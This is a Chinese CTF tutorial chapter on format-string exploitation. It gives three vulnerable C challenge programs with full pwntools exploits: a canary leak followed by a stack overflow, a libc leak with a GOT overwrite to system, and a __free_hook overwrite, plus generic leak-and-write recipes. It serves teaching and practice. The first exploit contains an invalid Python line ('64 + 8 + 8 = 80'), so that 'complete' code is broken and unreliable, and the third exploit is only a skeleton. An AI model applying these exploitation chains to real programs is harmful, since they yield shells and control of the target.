## 16.1 例题一：泄露 Canary 后栈溢出

### 题目描述

程序开启了 Canary，有一个格式化字符串漏洞和一个栈溢出漏洞，需要绕过 Canary 后 getshell。

```c
#include <stdio.h>
#include <string.h>

void backdoor() {
    system("/bin/sh");
}

int main() {
    char buf[64];
    
    printf("Name: ");
    scanf("%s", buf);
    printf("Hello, ");
    printf(buf);              // 漏洞 1：格式化字符串
    printf("\n");
    
    printf("Message: ");
    read(0, buf, 200);        // 漏洞 2：栈溢出（但没有覆盖 Canary 就无法返回）
    
    return 0;
}
```

编译（保留 Canary）：

```bash
gcc -g -O0 -no-pie -fstack-protector-all -o chall1 chall1.c
```

### 分析

1. 第一次输入用 `%N$p` 泄露 Canary
2. 第二次输入用栈溢出覆盖返回地址，但必须把泄露的 Canary 原样填回

### 完整 exp

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

elf = ELF('./chall1', checksec=False)

p = process(elf.path)

# ====== 第一步：泄露 Canary ======
# 先用 %p 序列找出 Canary 的偏移量（这里假设已测出为 11）
p.sendlineafter(b'Name: ', b'%11$p')
p.recvuntil(b'Hello, ')
canary = int(p.recvline().strip(), 16)
log.success(f'Canary: {hex(canary)}')

# ====== 第二步：栈溢出 ======
# buf 到 Canary 的偏移 64，Canary 8 字节，rbp 8 字节
offset_to_canary = 64
offset_to_ret = 64 + 8 + 8 = 80

payload = flat({
    0: b'A' * offset_to_canary,
    offset_to_canary: p64(canary),          # 原样填回 Canary
    offset_to_canary + 8: p64(0),           # 伪造 rbp
    offset_to_ret: p64(elf.sym['backdoor']) # 返回到后门
})

p.sendlineafter(b'Message: ', payload)
p.interactive()
```

## 16.2 例题二：改写 GOT 表

### 题目描述

程序没有后门函数，但导入了 `puts`。利用格式化字符串泄露 libc，再覆写 GOT 表。

```c
#include <stdio.h>

int main() {
    char buf[100];
    while (1) {
        printf("> ");
        scanf("%s", buf);
        printf(buf);
        printf("\n");
    }
}
```

### 分析

这是一个循环，可以多次利用。流程：

1. 泄露 `puts@got` → 得到 libc 基址
2. 用 `fmtstr_payload` 把 `puts@got` 改成 `system`
3. 再次输入 `/bin/sh`，程序调用 `puts(buf)` 时实际执行 `system("/bin/sh")`

### 完整 exp

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

elf = ELF('./chall2', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

p = process(elf.path)

# ====== 第一步：确定偏移量 ======
# 发送标记字符串，找到它在输出中的位置
p.sendlineafter(b'> ', b'AAAAAAAA%6$p')
out = p.recvline()
# 如果输出包含 0x4141414141414141，说明偏移量是 6
offset = 6

# ====== 第二步：泄露 libc ======
payload = p64(elf.got['puts']) + b'%6$s'
p.sendlineafter(b'> ', payload)
p.recvuntil(b'> ')   # 跳过提示符
leak = p.recvline().strip()[:6]
puts_addr = u64(leak.ljust(8, b'\x00'))
log.success(f'puts: {hex(puts_addr)}')

libc_base = puts_addr - libc.sym['puts']
system_addr = libc_base + libc.sym['system']
log.success(f'system: {hex(system_addr)}')

# ====== 第三步：覆写 puts@got ======
payload = fmtstr_payload(offset, {elf.got['puts']: system_addr})
p.sendlineafter(b'> ', payload)

# ====== 第四步：触发 system("/bin/sh") ======
p.sendlineafter(b'> ', b'/bin/sh')
p.interactive()
```

> ⚠️ **注意**：`fmtstr_payload` 生成的 payload 可能包含换行符或其他特殊字符，和 `scanf("%s")` 的输入方式可能有冲突。如果发送失败，改用 `send()` 而不是 `sendline()`，或者用 `read` 型输入。

## 16.3 例题三：绕过 Full RELRO——改写 __free_hook

### 题目描述

程序开启 Full RELRO，GOT 不可写。但 glibc 版本低于 2.34，`__free_hook` 仍然有效。

### 分析

`__free_hook` 是 libc 中的一个函数指针。当调用 `free(ptr)` 时，如果 `__free_hook` 不为 NULL，就会调用它指向的函数，并把 `ptr` 作为第一个参数。

如果把 `__free_hook` 改成 `system`，那么 `free("/bin/sh")` 就等价于 `system("/bin/sh")`。

### 完整 exp（骨架）

```python
#!/usr/bin/env python3
from pwn import *

elf = ELF('./chall3')
libc = ELF('./libc.so.6')

p = process(elf.path)

# 1. 泄露 libc 基址（同例题二）
# ...

# 2. 计算 __free_hook 和 system 地址
free_hook = libc_base + libc.sym['__free_hook']
system_addr = libc_base + libc.sym['system']

# 3. 用格式化字符串把 __free_hook 改成 system
payload = fmtstr_payload(offset, {free_hook: system_addr})
p.sendlineafter(b'> ', payload)

# 4. 触发 free("/bin/sh")
# 需要程序有一个 free 操作，且能被控制为释放包含 "/bin/sh" 的块
# 具体触发方式取决于程序逻辑
p.sendlineafter(b'> ', b'/bin/sh')
p.interactive()
```

> 💡 **提示**：glibc 2.34 移除了 `__free_hook` / `__malloc_hook`，所以这道题只适用于老版本 libc。新版本下需要改用 IO_FILE 相关技术（第 26 章）。

## 16.4 格式化字符串利用的通用套路

把三道例题抽象成套路：

### 套路一：信息泄露

```python
# 遍历找偏移
for i in range(1, 50):
    send(f'%{i}$p')
    if looks_like_target(output):
        offset = i
        break

# 精确泄露
send(f'%{offset}$p')
target_value = parse(output)
```

常见的泄露目标：

- Canary → 绕过栈保护
- 栈指针 → 得到栈地址
- GOT 表项 → 得到 libc 基址
- 返回地址 → 得到 PIE 基址

### 套路二：任意地址写

```python
# 小值写入（≤ 0xffff）
fmtstr_payload(offset, {target_addr: small_value})

# 大值写入（地址）→ 分两次 %hn
fmtstr_payload(offset, {target_addr: full_address})
```

常见的写入目标：

- GOT 表项（Partial RELRO）→ 劫持函数
- `__free_hook` / `__malloc_hook`（glibc < 2.34）→ free/malloc 时 getshell
- `__stack_chk_fail@got` → 绕过 Canary 检查
- 返回地址 → 直接控制流劫持

### 套路三：组合利用

大多数题目需要组合使用：

```text
泄露 Canary → 泄露 libc → 栈溢出 + ROP → getshell
或
泄露 libc → 覆写 GOT/hook → 触发 getshell
```

## 16.5 常见坑总结

1. **偏移量在两次调用间可能不同**：如果格式字符串是在不同的函数中调用的，栈布局不同，偏移量也不同。
2. **pwntools 的 fmtstr_payload 参数**：`numbwritten` 参数用于处理格式字符串之前已经输出的字符数，如果程序在 printf 前有输出，需要正确设置。
3. **地址中的空字节**：用 `p64()` 构造的 payload 可能包含 `\x00`，某些输入函数会截断。
4. **输出缓冲**：程序如果使用了 `setvbuf` 设置了全缓冲，printf 的输出可能不会立即刷新，导致接收不到数据。解决：用 `sendlineafter` 等同步手段，或强制刷新。

## 16.6 小结

这一章我们通过三道例题，把格式化字符串的利用技术串成了完整的攻击链：

- **泄露 Canary + 栈溢出**（经典组合）
- **泄露 libc + GOT 覆写**（无后门函数时）
- **改写 hook 函数**（Full RELRO 时）

格式化字符串是「信息泄露之王」，它往往是复杂利用的第一块拼图。熟练掌握它，你就能打通 PWN 利用的「任督二脉」。
